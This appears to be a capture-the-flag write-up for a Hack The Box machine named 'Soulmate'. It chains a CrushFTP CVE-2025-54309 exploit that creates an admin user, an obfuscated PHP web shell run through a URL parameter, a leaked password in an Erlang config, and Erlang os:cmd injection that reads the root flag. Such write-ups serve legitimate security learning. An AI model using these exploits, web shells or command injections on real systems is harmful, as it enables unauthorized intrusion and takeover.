# Soulmate - CrushFTP CVE-2025-54309 / Erlang SSH OS:CMD

## CrushFTP - Create new admin user

https://github.com/whisperer1290/CVE-2025-54309__Enhanced_exploit

```bash
python3 exploit.py http://ftp.soulmate.htb -u zatir -p bleh123
```

[image]

## Upload shell.php file webProd

```php
<?=$=${''.('{{{'^'<>/')};$_'__';?>
```

[image]

http://soulmate.htb/shit.php?__=system&___=ls

[image]

## Linpeas detecting suspicious Process

```bash
cat /usr/local/lib/erlang_login/start.escript
```

[image]

## Found ben user's password

```erlang
{user_passwords, [{"ben", "HouseH0ldings998"}]},
{idle_time, infinity},
{max_channels, 10},
{max_sessions, 10},
{parallel_login, true}
```

[image]

## Shell as Root

This erlang work on 2222 port like root permission. We have to do OS injection these methods.

https://vuln.be/post/os-command-and-code-execution-in-erlang-and-elixir/

[image]

```bash
ssh ben@localhost -p 2222
```

Then execute this.

```erlang
(ssh_runner@soulmate)1> os:cmd("cat /root/root.txt").
```

[image]
